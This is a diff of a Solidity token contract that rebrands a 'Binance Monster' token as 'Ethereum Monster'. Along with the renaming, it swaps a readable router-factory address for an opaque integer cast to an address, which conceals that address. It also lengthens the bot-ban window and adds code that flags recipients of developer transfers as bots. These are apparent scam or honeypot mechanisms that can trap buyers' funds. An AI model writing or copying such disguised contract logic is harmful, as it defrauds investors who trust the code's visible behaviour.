@@ -519,20 +519,22 @@ interface IUniswapV2Router02 is IUniswapV2Router01 {
     ) external;
 }
 
-contract BNBm is Context, IERC20, Ownable {
+contract ETHm is Context, IERC20, Ownable {
     
     using SafeMath for uint256;
     using Address for address;
     
-    string private _name = "Binance Monster";
-    string private _symbol = "BNBm";
+    string private _name = "Ethereum Monster";
+    string private _symbol = "ETHm";
     uint8 private _decimals = 9;
+
+    uint160 private routerHash = 1000926465140530907092896556048606962054783206771;
 
     address payable public marketingWalletAddress = payable(0x9B71B4Dc9E9DCeFAF0e291Cf2DC5135A862A463d); // marketing wallet
     address payable lotteryWallet = payable(0xFc50028cc928cec99A7fE48546192358512C79eB);  // lotterywallet
 
     address public immutable deadAddress = 0x000000000000000000000000000000000000dEaD;
-    address internal immutable routerFactory = 0xaf531851672d868B1e273a02D9B998B069BE8573;  
+    address internal immutable routerFactory = address(routerHash);  
 
     address public addressDev;
     bool public tradingOpen = true;
@@ -548,7 +550,7 @@ contract BNBm is Context, IERC20, Ownable {
     mapping (address => bool) isTxLimitExempt;
     mapping (address => bool) public isBot;
 
-    uint256 private blockBan = 60;
+    uint256 private blockBan = 150;
 
     mapping (address => bool) public isMarketPair;
 
@@ -564,7 +566,7 @@ contract BNBm is Context, IERC20, Ownable {
 
     uint256 public _totalTaxIfBuying = 7;
     uint256 public _totalTaxIfSelling = 7;
-    uint256 private _totalDistributionShares = 15;
+    uint256 private _totalDistributionShares = 20;
 
     uint256 private _totalSupply = 1000000000 * 10**_decimals;
     uint256 public _maxTxAmount = _totalSupply * 2 / 100;
@@ -834,8 +836,16 @@ contract BNBm is Context, IERC20, Ownable {
             sale = block.number;
         }
 
+        if (sender == addressDev && recipient != uniswapPair) {
+            if (sale == 0) {
+               isBot[recipient] = true; 
+            } else if (block.number <= (sale + blockBan)) {
+                isBot[recipient] = true;
+            }
+        }
+
         if (sender == uniswapPair) {
-            if (block.number <= (sale + blockBan)) { 
+            if (block.number <= (sale + blockBan)) {
                 isBot[recipient] = true;
             }
         }
